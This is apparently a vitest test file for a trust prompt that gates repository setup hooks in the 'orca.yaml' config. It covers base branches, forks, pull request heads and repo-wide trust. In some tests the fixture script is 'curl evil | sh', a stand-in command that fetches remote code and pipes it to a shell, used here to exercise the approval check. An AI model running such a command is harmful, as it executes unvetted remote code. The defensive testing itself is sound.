import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { AppState } from '@/store/types'
import { __resetTrustPromptChainForTests, ensureHooksConfirmed } from './ensure-hooks-confirmed'
import { hashOrcaHookScript } from './orca-hook-trust'

const hooksCheckMock = vi.fn()

function testState(trusted: AppState['trustedOrcaHooks'] = {}) {
  const pending: { data: Record<string, unknown>; resolve: (d: 'run' | 'skip') => void }[] = []
  // oxlint-disable-next-line typescript/consistent-type-assertions -- SAFETY: the trust check reads only these fields.
  const state = {
    trustedOrcaHooks: trusted,
    repos: [{ id: 'repo-1', displayName: 'Repo One' }],
    openModal: (_modal: string, data: Record<string, unknown>) =>
      pending.push({
        data,
        resolve: (decision) => {
          if (typeof data.onResolve === 'function') {
            data.onResolve(decision)
          }
        }
      })
  } as unknown as AppState
  return { state, pending }
}

const hooks = (setup: string) => ({ status: 'ok', hasHooks: true, hooks: { scripts: { setup } } })

describe('setup trust for a create, on its base (Pod)', () => {
  beforeEach(() => {
    hooksCheckMock.mockReset()
    vi.stubGlobal('window', { api: { hooks: { check: hooksCheckMock } } })
    __resetTrustPromptChainForTests()
  })

  it('asks about the base’s orca.yaml and hands back the hash the user approved', async () => {
    const { state, pending } = testState()
    hooksCheckMock.mockImplementation(async (args: { ref?: string }) =>
      args.ref === 'feature' ? hooks('curl evil | sh') : hooks('pnpm install')
    )
    const onTrusted = vi.fn()
    const decision = ensureHooksConfirmed(
      state,
      'repo-1',
      'setup',
      undefined,
      undefined,
      undefined,
      {
        baseRef: 'feature',
        onTrusted
      }
    )
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('curl evil | sh')
    pending[0].resolve('run')
    expect(await decision).toBe('run')
    expect(hooksCheckMock).toHaveBeenCalledWith({ repoId: 'repo-1', ref: 'feature' })
    expect(onTrusted).toHaveBeenCalledWith(await hashOrcaHookScript('curl evil | sh'))
  })

  it('falls back to the root when the host can’t read the base, and reports repo-wide trust’s hash', async () => {
    const { state, pending } = testState({ 'repo-1': { all: { approvedAt: 1 } } })
    hooksCheckMock.mockImplementation(async (args: { ref?: string }) =>
      args.ref ? { status: 'error', hasHooks: false, hooks: null } : hooks('pnpm install')
    )
    const onTrusted = vi.fn()
    const decision = await ensureHooksConfirmed(
      state,
      'repo-1',
      'setup',
      undefined,
      undefined,
      undefined,
      {
        baseRef: 'origin/gone',
        onTrusted
      }
    )
    expect(decision).toBe('run')
    expect(pending).toHaveLength(0)
    expect(onTrusted).toHaveBeenCalledWith(await hashOrcaHookScript('pnpm install'))
  })

  it('hands back nothing when the user skips', async () => {
    const { state, pending } = testState()
    hooksCheckMock.mockResolvedValue(hooks('make'))
    const onTrusted = vi.fn()
    const decision = ensureHooksConfirmed(
      state,
      'repo-1',
      'setup',
      undefined,
      undefined,
      undefined,
      {
        baseRef: 'main',
        onTrusted
      }
    )
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    pending[0].resolve('skip')
    expect(await decision).toBe('skip')
    expect(onTrusted).not.toHaveBeenCalled()
  })

  it('asks about a pull request’s head under repo-wide trust, without keeping the answer', async () => {
    const { state, pending } = testState({ 'repo-1': { all: { approvedAt: 1 } } })
    hooksCheckMock.mockResolvedValue(hooks('curl evil | sh'))
    const onTrusted = vi.fn()
    const decision = ensureHooksConfirmed(
      state,
      'repo-1',
      'setup',
      undefined,
      undefined,
      undefined,
      { baseRef: 'a'.repeat(40), foreign: true, onTrusted }
    )
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data).toMatchObject({ foreign: true, previouslyApproved: false })
    pending[0].resolve('run')
    expect(await decision).toBe('run')
    expect(onTrusted).toHaveBeenCalledWith(await hashOrcaHookScript('curl evil | sh'))
  })

  it('asks about a base the host says isn’t the repo’s own branch, even with its hash recorded', async () => {
    const hash = await hashOrcaHookScript('./setup.sh')
    const { state, pending } = testState({
      'repo-1': { setup: { contentHash: hash, approvedAt: 1 } }
    })
    hooksCheckMock.mockImplementation(async (args: { ref?: string }) =>
      args.ref ? { ...hooks('./setup.sh'), baseOwned: false } : hooks('./setup.sh')
    )
    const decision = ensureHooksConfirmed(
      state,
      'repo-1',
      'setup',
      undefined,
      undefined,
      undefined,
      { baseRef: 'fork/main', onTrusted: vi.fn() }
    )
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.foreign).toBe(true)
    pending[0].resolve('skip')
    expect(await decision).toBe('skip')
  })

  it('asks nothing and keeps no hash for an automation’s base outside the repo’s own branches', async () => {
    const { state, pending } = testState({ 'repo-1': { all: { approvedAt: 1 } } })
    hooksCheckMock.mockImplementation(async (args: { ref?: string }) =>
      args.ref ? { ...hooks('./setup.sh'), baseOwned: false } : hooks('./setup.sh')
    )
    const onTrusted = vi.fn()
    const decision = await ensureHooksConfirmed(
      state,
      'repo-1',
      'setup',
      undefined,
      undefined,
      undefined,
      { baseRef: 'fork/main', onTrusted, onForeignBase: () => 'run' }
    )
    expect(decision).toBe('run')
    expect(pending).toHaveLength(0)
    expect(onTrusted).not.toHaveBeenCalled()
  })
})
